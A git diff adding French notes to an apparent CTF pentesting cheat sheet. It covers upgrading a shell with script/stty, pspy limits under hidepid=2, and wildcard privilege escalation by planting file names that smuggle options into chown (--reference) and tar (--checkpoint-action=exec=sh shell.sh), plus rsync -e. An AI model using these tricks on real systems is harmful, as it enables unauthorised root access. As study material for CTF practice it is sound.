@@ -1,6 +1,19 @@
 # Reconnaissance
 # Scanning & Enumeration
 
+# Lateral movement
+## Amelioration du shell
+- Si python n'est pas présent 
+<code> script /dev/null -c bash</code>
+ou
+```console
+script /dev/null -c bash
+ctrl-z
+stty raw -echo; fg
+Enter twice
+```
+
+
 
 # Exploitation (Gaining Access)
 # Exfiltration de données
@@ -37,6 +50,7 @@ joindre localhost:<port_localhost>
 # Privilege Escalation
 ## Recherche de défaut de configuration et de vulnérabilités
 ### Utilisation de pspy
+Si /proc est monté avec hidepid=2 il n'est pas possible lister les process d'autres utilisateurs
 Le script peut-être trouvé ici: https://github.com/DominicBreuker/pspy.git 
 ### Utilisation de linpeas
 Lien vers le binaire: https://github.com/carlospolop/PEASS-ng/releases
@@ -45,6 +59,32 @@ Lien vers le binaire: https://github.com/carlospolop/PEASS-ng/releases
 capsh --print
 ```
 Liste des exploists liés aux capabilities https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search 
+
+## Wildcard 
+Source: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+### File owner hijacking via Chown
+chown -R <utilisateur>:<group> *.extension
+Peut être bypassé par l'option --reference=<autre_fichier> qui confère au propriétaire de <autre_fichier> l'ensemble des fichiers visé par le chown.  
+Il est également possible d'ajouter un fichier avec la commande suivante:
+```console
+echo "" > monfichier.extension
+echo > --reference=monfichier.extension
+```
+Ainsi quand la commande sera exécuté les fichiers prendront le propriétaire et le groupe de monfichier.extension
+
+### Tar Wildcard Injection
+La commande tar permet aussi l'exécution de commande grâce aux options:  
+```console
+--checkpoint-action=exec=sh shell.sh
+--checkpoint=1
+```
+checkpoint permet d'afficher un messages pour x compression (par défaut 10)
+checkpoint-action=ACTION permet d'éxécuter une ACTION à chaque checkpoint.
+
+### Rsync execution
+L'option -e de l commande rsync permet d'executer une commande ssh sur l'hôte distant.
+
 # Command & Control (Persistence/Maintaining Access)
 # Clearing Tracks (usually not necessary in CTF’s, but good practice)
 
